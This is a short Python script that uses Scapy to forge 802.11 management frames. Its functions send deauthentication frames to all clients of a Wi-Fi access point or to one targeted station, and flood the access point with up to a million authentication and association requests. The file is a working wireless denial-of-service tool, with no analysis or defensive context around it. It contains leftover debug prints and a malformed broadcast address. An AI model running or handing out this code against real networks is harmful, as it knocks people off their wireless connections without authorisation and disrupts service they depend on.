from scapy.all import Dot11,RadioTap,sendp,RandMAC,Dot11Deauth,Dot11Auth,Dot11AssoReq
import argparse
from threading import *

def deauth_broadcast(iface: str, bssid: str):
  # AP broadcast
  dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)
  frame = RadioTap()/dot11/Dot11Deauth()
  sendp(frame, iface=iface, loop=10, inter=0.00100)

def deauth_station(iface: str, bssid: str, target_mac: str):
  # Station unicast
  '''
  print(11111111111111111)
  dot11 = Dot11(addr1=bssid, addr2=target_mac, addr3=target_mac)
  frame = RadioTap()/dot11/Dot11Deauth()
  sendp(frame, iface=iface, loop=10, inter=0.00100)
  '''
  # AP unicast
  print(22222222222222222)
  dot11 = Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)
  frame = RadioTap()/dot11/Dot11Deauth()
  sendp(frame, iface=iface, loop=10, inter=0.00100)  
    
def auth(iface: str, bssid: str, target_mac: str):
  # Station unicast
  dot11 = Dot11(addr1=bssid, addr2=target_mac, addr3=bssid)
  frame = RadioTap()/dot11/Dot11Auth()/Dot11AssoReq(cap=0x1100, listen_interval=0x00a)
  sendp(frame, iface=iface, count=1000000, inter=0.00100)

if __name__ == "__main__":
  parser = argparse.ArgumentParser()   
  parser.add_argument("interface")
  parser.add_argument("ap",metavar="AP_MAC")
  parser.add_argument("-s","--station", metavar="STATION_MAC",help='')
  parser.add_argument("-auth",help='',action='store_true')
  args = parser.parse_args()
  if args.auth:
    if args.interface and args.ap and args.station:
      auth(args.interface, args.ap, args.station)
    else:
      print('Please!!')
  else:
    if args.interface and args.ap and args.station:
      deauth_station(args.interface, args.ap, args.station)
    elif args.interface and args.ap:
      deauth_broadcast(args.interface, args.ap)
    else:
      print('Please!!')